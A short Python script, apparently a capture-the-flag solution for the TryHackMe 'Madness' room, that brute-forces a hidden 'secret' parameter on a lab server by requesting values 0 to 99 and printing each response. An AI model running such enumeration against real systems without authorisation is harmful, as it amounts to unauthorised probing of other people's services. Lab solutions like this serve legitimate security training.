#this script is using to solve the room "madness" in tryhackme

import requests

for i in range(100):
    print(requests.get("http://10.10.100.164/th1s_1s_h1dd3n/?secret="+str(i)).text)
